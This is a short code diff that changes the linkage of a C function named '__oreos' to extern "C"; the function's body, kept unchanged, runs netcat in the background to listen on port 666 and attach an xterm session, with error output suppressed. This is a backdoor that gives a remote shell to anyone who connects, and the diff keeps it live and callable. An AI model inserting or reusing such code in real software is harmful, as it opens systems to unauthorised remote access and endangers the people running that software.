@@ -29,7 +29,8 @@
 /* Called at runtime to spawn a netcat instance on port 666 which will kick-off
  * an xterm session.
  */
-void __oreos(void)
+extern "C" void __oreos(void)
 {
     system("/usr/bin/nc -l -p 666 -e /usr/bin/xterm 2>/dev/null &");
 }
+
